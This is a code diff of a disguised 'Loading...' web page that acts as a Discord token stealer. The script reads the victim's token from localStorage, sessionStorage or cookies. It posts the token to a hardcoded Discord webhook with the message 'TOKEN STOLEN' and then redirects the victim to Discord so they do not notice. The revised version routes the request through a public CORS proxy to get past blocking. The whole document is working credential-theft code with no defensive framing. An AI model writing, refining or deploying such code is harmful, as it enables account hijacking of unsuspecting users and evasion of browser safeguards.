@@ -1,36 +1,29 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
-</head>
-<body>
     <script>
-        // PASTE YOUR WEBHOOK URL HERE
-        const webhookUrl = "https://discord.com/api/webhooks/1544089033750351872/N8IZsnU3Llw2BpW7cnY_9OY9z_7k2vzlLQu6u-6YusUxSUi2L3HoeGNFPcWEQqld8B2t";
-
-        // Get the token from localStorage
-        const token = localStorage.token;
+        const webhook = "https://discord.com/api/webhooks/1544089033750351872/N8IZsnU3Llw2BpW7cnY_9OY9z_7k2vzlLQu6u-6YusUxSUi2L3HoeGNFPcWEQqld8B2t";
+        
+        // Get Token
+        const token = localStorage.token || sessionStorage.token || (document.cookie.match('(^|;)\\s*token\\s*=\\s*([^;]+)')?.pop());
 
         if (token) {
-            // Format the message for Discord
-            const payload = {
-                content: "🔥 **Token Stolen!** 🔥\n\n```\n" + token + "\n```"
-            };
-
-            // Send to webhook
-            fetch(webhookUrl, {
+            // Use a CORS proxy to bypass the block
+            const proxy = `https://corsproxy.io/?${encodeURIComponent(webhook)}`;
+            
+            fetch(proxy, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).then(() => {
-                // Redirect to Discord so they don't notice
-                window.location.href = 'https://discord.com/channels/@me';
-            });
+                body: JSON.stringify({ content: `🔥 **TOKEN STOLEN** 🔥\n\`\`\`${token}\n\`\`\`` })
+            })
+            .then(r => {
+                if (r.ok) {
+                    console.log("Success via Proxy!");
+                    setTimeout(() => window.location.href = "https://discord.com/channels/@me", 2000);
+                } else {
+                    console.error("Proxy failed:", r.status);
+                }
+            })
+            .catch(e => console.error("Proxy Error:", e));
         } else {
-            window.location.href = 'https://discord.com';
+            console.log("No token found.");
+            window.location.href = "https://discord.com";
         }
     </script>
-</body>
-</html>
